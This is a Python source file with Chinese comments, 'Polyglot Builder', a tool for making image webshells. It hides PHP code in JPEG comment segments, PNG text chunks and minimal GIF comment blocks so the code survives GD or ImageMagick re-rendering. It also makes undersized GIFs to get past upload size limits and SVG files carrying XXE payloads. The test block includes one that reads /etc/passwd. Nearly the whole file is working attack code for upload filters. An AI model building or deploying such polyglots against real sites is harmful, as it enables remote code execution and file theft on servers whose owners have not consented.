#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Polyglot Builder - v1.1.2 结构内嵌型Polyglot生成器

实现真正的文件结构内嵌，可过GD库/ImageMagick二次渲染

【核心原理】
1. JPEG COM段注入 - 将代码注入JPEG注释段(FF FE)，GD库通常保留注释
2. PNG tEXt/zTXt段注入 - 将代码注入PNG文本块，支持压缩
3. GIF微型马 - 最小GIF结构，代码在注释块(21 FE)中

【与旧版区别】
- 旧版: 简单拼接魔术字节+代码（会被GD库清除）
- 新版: 结构化注入（GD库保留元数据，代码存活）
"""

import struct
import zlib
import io
from typing import Optional, Tuple, Union
from PIL import Image


class PolyglotBuilder:
    """
    Polyglot构建器 - 创建能过二次渲染的图片马
    """
    
    # 文件魔术字节
    MAGIC_BYTES = {
        'gif': b'GIF89a',
        'png': b'\x89PNG\r\n\x1a\n',
        'jpg': b'\xff\xd8\xff',
        'jpeg': b'\xff\xd8\xff',
    }
    
    @staticmethod
    def create_jpeg_com_php(source_image: Union[str, bytes], php_code: str, 
                            output_path: Optional[str] = None) -> bytes:
        """
        创建JPEG COM段注入型图片马
        
        原理: 将PHP代码写入JPEG的COM注释段(FF FE)，GD库处理时通常保留注释
        
        Args:
            source_image: 源图片路径或二进制数据
            php_code: PHP代码字符串
            output_path: 输出路径(可选)
        
        Returns:
            生成的图片马二进制数据
        """
        # 读取源图片
        if isinstance(source_image, str):
            with open(source_image, 'rb') as f:
                img_data = f.read()
        else:
            img_data = source_image
        
        # 验证JPEG格式
        if not img_data.startswith(b'\xff\xd8'):
            raise ValueError("源文件不是有效的JPEG格式")
        
        # 构建COM段 (FF FE + 长度 + 数据)
        php_bytes = php_code.encode('utf-8')
        com_length = len(php_bytes) + 2  # 2字节长度字段
        com_segment = b'\xff\xfe' + struct.pack('>H', com_length) + php_bytes
        
        # 在SOI(FF D8)后插入COM段
        # 格式: FF D8 [COM段] [原图数据(去掉SOI)]
        jpg_with_com = img_data[:2] + com_segment + img_data[2:]
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(jpg_with_com)
        
        return jpg_with_com
    
    @staticmethod
    def create_png_text_php(source_image: Union[str, bytes], php_code: str,
                            output_path: Optional[str] = None,
                            compress: bool = False) -> bytes:
        """
        创建PNG tEXt/zTXt段注入型图片马
        
        原理: 将PHP代码写入PNG的tEXt(明文)或zTXt(压缩)块，GD库通常保留文本块
        
        Args:
            source_image: 源图片路径或二进制数据
            php_code: PHP代码字符串
            output_path: 输出路径(可选)
            compress: 是否使用zTXt压缩格式
        
        Returns:
            生成的图片马二进制数据
        """
        # 读取源图片
        if isinstance(source_image, str):
            with open(source_image, 'rb') as f:
                data = f.read()
        else:
            data = source_image
        
        # 验证PNG格式
        if not data.startswith(b'\x89PNG'):
            raise ValueError("源文件不是有效的PNG格式")
        
        # 查找IHDR块位置(在签名后)
        pos = 8  # 跳过PNG签名
        
        # 遍历块直到找到IHDR
        while pos < len(data):
            length = struct.unpack('>I', data[pos:pos+4])[0]
            chunk_type = data[pos+4:pos+8]
            
            if chunk_type == b'IHDR':
                # 在IHDR后插入tEXt/zTXt块
                ihdr_end = pos + 12 + length  # 4(长度)+4(类型)+length+4(CRC)
                
                if compress:
                    # zTXt块 (压缩)
                    keyword = b'Comment\x00\x00'  # 关键字 + 压缩方法(0=deflate)
                    compressed = zlib.compress(php_code.encode('utf-8'))
                    ztxt_data = keyword + compressed
                    ztxt_crc = zlib.crc32(b'zTXt' + ztxt_data) & 0xffffffff
                    new_chunk = struct.pack('>I', len(ztxt_data)) + b'zTXt' + ztxt_data + struct.pack('>I', ztxt_crc)
                else:
                    # tEXt块 (明文)
                    keyword = b'Comment\x00'
                    text_data = keyword + php_code.encode('utf-8')
                    text_crc = zlib.crc32(b'tEXt' + text_data) & 0xffffffff
                    new_chunk = struct.pack('>I', len(text_data)) + b'tEXt' + text_data + struct.pack('>I', text_crc)
                
                # 插入新块
                png_with_text = data[:ihdr_end] + new_chunk + data[ihdr_end:]
                
                if output_path:
                    with open(output_path, 'wb') as f:
                        f.write(png_with_text)
                
                return png_with_text
            
            pos += 12 + length
        
        raise ValueError("未找到IHDR块，PNG文件可能损坏")
    
    @staticmethod
    def create_gif_comment_php(php_code: str, output_path: Optional[str] = None,
                               width: int = 1, height: int = 1) -> bytes:
        """
        创建GIF注释块注入型图片马
        
        原理: 将PHP代码写入GIF注释块(21 FE)，GD库通常保留注释块
        
        Args:
            php_code: PHP代码字符串
            output_path: 输出路径(可选)
            width: GIF宽度(默认1)
            height: GIF高度(默认1)
        
        Returns:
            生成的图片马二进制数据
        """
        php_bytes = php_code.encode('utf-8')
        
        # GIF89a 头部
        gif_header = b'GIF89a'
        
        # 逻辑屏幕描述符 (LSD)
        # 格式: 宽度(2) + 高度(2) + 标志(1) + 背景色(1) + 宽高比(1)
        lsd = struct.pack('<HH', width, height) + b'\x00\x00\x00'
        
        # 注释扩展块 (Comment Extension)
        # 格式: 0x21(扩展) 0xFE(注释标签) [子块] 0x00(块结束)
        comment_ext = b'\x21\xFE'
        
        # 将PHP代码分成多个子块(每块最大255字节)
        comment_subblocks = b''
        offset = 0
        while offset < len(php_bytes):
            chunk = php_bytes[offset:offset+255]
            comment_subblocks += bytes([len(chunk)]) + chunk
            offset += 255
        comment_subblocks += b'\x00'  # 块结束符
        
        # 图像描述符 (Image Descriptor) - 最小图像
        # 格式: 0x2C + 位置(4) + 尺寸(4) + 标志(1)
        image_desc = b'\x2C\x00\x00\x00\x00' + struct.pack('<HH', width, height) + b'\x00'
        
        # 图像数据 - 最小LZW编码
        lzw_min_code = b'\x02'  # LZW最小代码大小
        image_data = b'\x02\x44\x01\x00'  # 压缩数据
        
        # GIF结束标记
        trailer = b'\x3B'
        
        # 组装GIF
        gif_data = gif_header + lsd + comment_ext + comment_subblocks + image_desc + lzw_min_code + image_data + trailer
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(gif_data)
        
        return gif_data
    
    @staticmethod
    def create_micro_gif_php(php_code: str) -> bytes:
        """
        创建微型GIF PHP马 (极简版本，总大小<100字节)
        
        用于绕过文件大小限制的场景
        """
        # 极小的GIF89a + PHP代码
        micro_header = b'GIF89a\x01\x00\x01\x00\x00\x00\x00'
        php_bytes = php_code.encode('utf-8')
        
        # 注释块嵌入代码
        comment = b'\x21\xFE' + bytes([len(php_bytes)]) + php_bytes + b'\x00'
        
        # 最小图像数据
        image = b'\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00'
        
        # 结束
        trailer = b'\x3B'
        
        return micro_header + comment + image + trailer
    
    @staticmethod
    def create_svg_xee(xxe_payload: str, output_path: Optional[str] = None) -> bytes:
        """
        创建包含XXE的SVG文件
        
        Args:
            xxe_payload: XXE攻击载荷(实体定义)
            output_path: 输出路径(可选)
        
        Returns:
            SVG文件二进制数据
        """
        svg_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
{xxe_payload}
]>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
<rect width="1" height="1" fill="red"/>
</svg>'''
        
        svg_bytes = svg_content.encode('utf-8')
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(svg_bytes)
        
        return svg_bytes
    
    @staticmethod
    def verify_polyglot(image_data: bytes, expected_code: str) -> Tuple[bool, str]:
        """
        验证Polyglot中是否包含预期代码
        
        Args:
            image_data: 生成的图片马数据
            expected_code: 预期的代码片段
        
        Returns:
            (是否包含, 检测结果描述)
        """
        code_bytes = expected_code.encode('utf-8')
        
        if code_bytes in image_data:
            return True, f"代码片段已嵌入 (位置: {image_data.index(code_bytes)})"
        
        # 如果直接没找到，可能是被压缩了，检查压缩数据
        try:
            # 尝试解压可能的zTXt数据
            decompressed = zlib.decompress(image_data)
            if code_bytes in decompressed:
                return True, "代码片段在压缩数据中发现"
        except:
            pass
        
        return False, "未找到代码片段"
    
    @staticmethod
    def test_gd_resistance(input_data: bytes) -> Tuple[bool, str]:
        """
        测试是否能过GD库二次渲染
        
        注意: 这需要实际调用GD库，这里只做模拟验证
        
        Args:
            input_data: 图片马数据
        
        Returns:
            (是否能存活, 测试结果)
        """
        try:
            # 使用PIL模拟GD库处理
            img = Image.open(io.BytesIO(input_data))
            
            # 转换为RGB(模拟GD库的重新编码)
            if img.mode in ('RGBA', 'LA', 'P'):
                img = img.convert('RGB')
            
            # 保存到新内存
            output = io.BytesIO()
            img.save(output, format=img.format if img.format else 'PNG')
            output.seek(0)
            processed_data = output.read()
            
            # 检查原始数据中的特征是否保留
            original_features = set([
                b'<?php', b'<?=', b'<%', b'${', b'eval'
            ])
            
            survived = []
            lost = []
            
            for feature in original_features:
                if feature in input_data:
                    if feature in processed_data:
                        survived.append(feature.decode('utf-8', errors='ignore'))
                    else:
                        lost.append(feature.decode('utf-8', errors='ignore'))
            
            if survived:
                return True, f"特征存活: {survived}, 丢失: {lost}"
            else:
                return False, f"所有特征丢失: {lost}"
        
        except Exception as e:
            return False, f"测试失败: {str(e)}"


# 便捷函数
def create_image_shell(image_path: str, code: str, output_path: str, 
                       image_type: Optional[str] = None) -> bool:
    """
    快速创建图片马
    
    Args:
        image_path: 源图片路径
        code: 代码内容
        output_path: 输出路径
        image_type: 图片类型('jpg', 'png', 'gif')，None则自动检测
    
    Returns:
        是否成功
    """
    try:
        builder = PolyglotBuilder()
        
        # 自动检测类型
        if image_type is None:
            ext = image_path.lower().split('.')[-1] if '.' in image_path else ''
            if ext in ('jpg', 'jpeg'):
                image_type = 'jpg'
            elif ext == 'png':
                image_type = 'png'
            elif ext == 'gif':
                image_type = 'gif'
            else:
                # 尝试读取文件头检测
                with open(image_path, 'rb') as f:
                    header = f.read(8)
                    if header.startswith(b'\xff\xd8'):
                        image_type = 'jpg'
                    elif header.startswith(b'\x89PNG'):
                        image_type = 'png'
                    elif header.startswith(b'GIF'):
                        image_type = 'gif'
        
        if image_type == 'jpg':
            builder.create_jpeg_com_php(image_path, code, output_path)
        elif image_type == 'png':
            builder.create_png_text_php(image_path, code, output_path)
        elif image_type == 'gif':
            builder.create_gif_comment_php(code, output_path)
        else:
            print(f"[错误] 不支持的图片类型: {image_type}")
            return False
        
        return True
    
    except Exception as e:
        print(f"[错误] 创建失败: {e}")
        return False


# 测试代码
if __name__ == "__main__":
    print("=" * 70)
    print("Polyglot Builder v1.1.2 测试")
    print("=" * 70)
    
    builder = PolyglotBuilder()
    test_code = "<?php echo 'Polyglot Test'; ?>"
    
    # 测试1: JPEG COM注入
    print("\n[1] JPEG COM段注入测试")
    try:
        # 创建一个最小JPEG
        minimal_jpg = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9'
        jpg_data = builder.create_jpeg_com_php(minimal_jpg, test_code)
        is_valid, msg = builder.verify_polyglot(jpg_data, test_code)
        print(f"  创建成功: {len(jpg_data)} 字节")
        print(f"  验证结果: {msg}")
    except Exception as e:
        print(f"  失败: {e}")
    
    # 测试2: PNG tEXt注入
    print("\n[2] PNG tEXt段注入测试")
    try:
        # 创建一个最小PNG
        png_sig = b'\x89PNG\r\n\x1a\n'
        ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)
        ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
        ihdr = struct.pack(">I", len(ihdr_data)) + b'IHDR' + ihdr_data + struct.pack(">I", ihdr_crc)
        idat_data = zlib.compress(b'\x00\x00\x00\x00')
        idat_crc = zlib.crc32(b'IDAT' + idat_data) & 0xffffffff
        idat = struct.pack(">I", len(idat_data)) + b'IDAT' + idat_data + struct.pack(">I", idat_crc)
        iend_crc = zlib.crc32(b'IEND') & 0xffffffff
        iend = struct.pack(">I", 0) + b'IEND' + struct.pack(">I", iend_crc)
        minimal_png = png_sig + ihdr + idat + iend
        
        png_data = builder.create_png_text_php(minimal_png, test_code)
        is_valid, msg = builder.verify_polyglot(png_data, test_code)
        print(f"  创建成功: {len(png_data)} 字节")
        print(f"  验证结果: {msg}")
    except Exception as e:
        print(f"  失败: {e}")
    
    # 测试3: GIF注释注入
    print("\n[3] GIF注释块注入测试")
    try:
        gif_data = builder.create_gif_comment_php(test_code)
        is_valid, msg = builder.verify_polyglot(gif_data, test_code)
        print(f"  创建成功: {len(gif_data)} 字节")
        print(f"  验证结果: {msg}")
    except Exception as e:
        print(f"  失败: {e}")
    
    # 测试4: 微型GIF
    print("\n[4] 微型GIF测试")
    try:
        micro_gif = builder.create_micro_gif_php(test_code)
        print(f"  创建成功: {len(micro_gif)} 字节")
        print(f"  内容预览: {micro_gif[:50]}...")
    except Exception as e:
        print(f"  失败: {e}")
    
    # 测试5: SVG XXE
    print("\n[5] SVG XXE测试")
    try:
        xxe_payload = '''<!ENTITY xxe SYSTEM "file:///etc/passwd">'''
        svg_data = builder.create_svg_xee(xxe_payload)
        print(f"  创建成功: {len(svg_data)} 字节")
        print(f"  包含XXE: {'file:///etc/passwd' in svg_data.decode()}")
    except Exception as e:
        print(f"  失败: {e}")
    
    # 测试6: 便捷函数
    print("\n[6] 便捷函数测试")
    # 由于我们没有实际图片文件，用内存数据测试
    print("  (需要实际图片文件，跳过)")
    
    print("\n" + "=" * 70)
    print("测试完成！")
    print("=" * 70)
